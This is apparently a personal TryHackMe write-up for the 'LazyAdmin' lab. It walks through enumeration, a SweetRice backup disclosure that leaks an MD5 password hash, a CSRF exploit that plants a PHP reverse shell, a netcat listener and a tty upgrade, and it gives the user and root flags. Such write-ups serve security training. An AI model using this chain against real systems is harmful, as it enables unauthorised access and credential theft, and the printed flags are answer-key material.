# LazyAdmin

```bash
export IP=10.10.216.244
```

## Scans

### Nmap

Command:
```bash
mmap -sC -sV -oN scans/nmap.initial $IP
```

Open Ports found:
```
22 -- ssh
80 -- webpage
```

URL found in page source:`https://bugs.launchpad.net/ubuntu/+source/apache2/+bug/1288690`


### Gobuster

Command:
```bash
gobuster dir -w wordlists/dirbuster/directory-list-2.3-medium.txt -u http://$IP
```

Directories found:
```
/content
```

URL found in /content: `http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/`


### Nikto

Command:
```bash
nikto -host $IP
```

## Searchsploit

Command:
```bash
searchsploit SweetRice
```

this exploit is uploadable and offers a login page:
```
SweetRice 1.5.1 - Cross-Site Request Forgery
```

Command: to copy an exploit
```bash
searchsploit -m /path/to/exploit.html
```


this exploit explains the location of a backup .sql file in `/content/inc/mysql_backup`:
```
SweetRice 1.5.1 - Backup disclosure
```

found in `/content/inc/mysql_backup`:

username and hash found: `manager:42f749ade7f9e195bf475f37a44cafcb`

run through `crackstation.net` reveals MD5 hash and password `Password123`


## Exploit
Command: runs the exploit and opens the login page -- Proof Of Concept
```bash
firefox exploit.html
```

check `/content/inc/ads/hacked.php` to see if php 'hacked' info  page is loaded in

if so: copy `revshell.php` code into `exploit.html`, remember to change $IP and $port and $value

start netcat listening port:
```bash
nc -lnvp 8888
```

Command: opens the login page as a background process and injects php reverse shell
```bash
firefox exploit.html &
firefox exploit.html
```

Visit `http://$IP/content/inc/ads/revshell.php` to spawn shell


### Upgrading to a tty shell

Command: uses `script`, so no need for Python
```bash
/usr/bin/script -qc /bin/bash /dev/null
```

**User Flag Found**: `THM{63e5bce9271952aad1113b6f1ac28a07}`


## PrivEsc


**Root flag**: `THM{6637f41d0177b6f37cb20d775124699f}`

---
[back to TryHackMe main page](thm.md)

[back to Index/Table of Contents](index.md)
